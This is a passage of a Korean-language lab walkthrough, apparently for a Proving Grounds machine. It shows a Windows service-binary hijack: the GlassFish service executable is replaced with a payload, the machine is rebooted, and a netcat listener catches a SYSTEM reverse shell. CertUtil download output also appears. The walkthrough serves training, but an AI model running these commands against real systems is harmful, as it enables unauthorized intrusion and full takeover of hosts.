  1c00
CertUtil: -URLCache command completed successfully.
```

`C:\glassfish4\glassfish\domains\domain1\bin` 의 경로에 보면 `GlassFish` 를 실행시키는 바이너리가 존재한다. `domain1Service.exe` 바이너리가 해당 파일이다.

```cmd
 Directory of C:\glassfish4\glassfish\domains\domain1\bin

10/28/2021  04:48 AM    <DIR>          .
10/28/2021  04:48 AM    <DIR>          ..
08/25/2024  09:53 PM                 0 domain1Service.err.log
10/28/2021  04:15 AM            30,208 domain1Service.exe
08/25/2024  09:53 PM                 0 domain1Service.out.log
08/25/2024  09:53 PM             1,692 domain1Service.wrapper.log
10/28/2021  04:15 AM             3,121 domain1Service.xml
               5 File(s)         35,021 bytes
               2 Dir(s)   2,432,139,264 bytes free
```

해당 파일은 `domain1Service.old.exe` 로 이름을 변경하고 `pwn.exe` 파일을 `domain1Service.exe` 파일로 옮겨준다. 

```cmd
C:\glassfish4\glassfish\domains\domain1\bin>move domain1Service.exe domain1Service.old.exe
move domain1Service.exe domain1Service.old.exe
        1 file(s) moved.

C:\glassfish4\glassfish\domains\domain1\bin>move C:\Users\arthur\Desktop\pwn.exe domain1Service.exe
move C:\Users\arthur\Desktop\pwn.exe domain1Service.exe
        1 file(s) moved.

C:\glassfish4\glassfish\domains\domain1\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 08DF-534D

 Directory of C:\glassfish4\glassfish\domains\domain1\bin

08/24/2022  09:52 PM    <DIR>          .
08/24/2022  09:52 PM    <DIR>          ..
08/25/2024  09:53 PM                 0 domain1Service.err.log
08/24/2022  09:50 PM             7,168 domain1Service.exe
10/28/2021  04:15 AM            30,208 domain1Service.old.exe
08/25/2024  09:53 PM                 0 domain1Service.out.log
08/25/2024  09:53 PM             1,692 domain1Service.wrapper.log
10/28/2021  04:15 AM             3,121 domain1Service.xml
               6 File(s)         42,189 bytes
               2 Dir(s)   2,432,139,264 bytes free
```

설정을 다 했으면 시스템을 종료시킨다. 

```bash
C:\glassfish4\glassfish\domains\domain1\bin>shutdown /r /t 0
shutdown /r /t 0

C:\glassfish4\glassfish\domains\domain1\bin>

┌──(root㉿kali)-[/home/kali/PG/Fish]
└─#
```

이후 리슨 하고 있으면 정상적으로 쉘을 획득할 수 있다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Fish]
└─# rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.168.168] 49669
Microsoft Windows [Version 10.0.19042.1288]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\proof.txt
70891449a77ae83df250...
```